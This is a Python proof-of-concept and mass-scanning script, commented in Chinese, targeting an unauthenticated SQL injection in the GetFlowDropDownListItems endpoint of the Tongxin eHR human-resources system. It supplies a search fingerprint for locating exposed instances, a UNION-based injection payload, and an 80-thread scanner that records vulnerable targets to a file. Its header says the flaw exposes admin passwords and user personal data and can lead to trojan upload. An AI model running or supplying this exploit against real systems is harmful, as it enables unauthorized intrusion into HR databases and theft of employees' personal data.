# -*- coding: utf-8 -*-
# 同鑫eHR人力资源管理系统 GetFlowDropDownListItems SQL注入漏洞
# body="/TX.CDN"
# 产品简介:同鑫eHR，聚焦人力资源管理痛点，首创提出人力资源管理系统一体化概念，打造应用一体化、数据一体化、流程一体化、终端一体化的人力资源管理系统一体化解决方案。为广大企业解决系统功能分散不同步、业务数据零散无价值、流程可自定义程度低、行业深度问题无法解决、缺乏移动办公体验等管理实际问题。涵盖组织、人事、考勤、薪酬、招聘、绩效、培训等18个模块，以及人才测评、行政后勤等多个方面。可与OA、ERP、MES、BI、电子签、钉钉、企微等无缝集成，支持功能定制和二次开发，满足企业的全面需求。
# 漏洞概述:同鑫eHR人力资源管理系统 GetFlowDropDownListItems 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
# POST型/SQL注入/联合注入

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
                    \x1b[38m████████╗██╗  ██╗     ███████╗██╗  ██╗██████╗ 
                    \x1b[36m╚══██╔══╝╚██╗██╔╝     ██╔════╝██║  ██║██╔══██╗
                    \x1b[34m   ██║    ╚███╔╝█████╗█████╗  ███████║██████╔╝
                    \x1b[35m   ██║    ██╔██╗╚════╝██╔══╝  ██╔══██║██╔══██╗
                    \x1b[31m   ██║   ██╔╝ ██╗     ███████╗██║  ██║██║  ██║
                    \x1b[33m   ╚═╝   ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Vession:同鑫eHR人力资源管理系统 GetFlowDropDownListItems SQL注入漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("同鑫eHR人力资源管理系统 GetFlowDropDownListItems SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/Common/GetFlowDropDownListItems"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
    }
    data = 'FixedFormCode=1%27%20UNION%20ALL%20SELECT%20NULL%2C@@VERSION--'
    try :
        response = requests.post(url=target+url_payload,headers=headers,verify=False,data=data,timeout=5)
        if response.status_code == 200 and 'Microsoft SQL' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('同鑫eHR.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()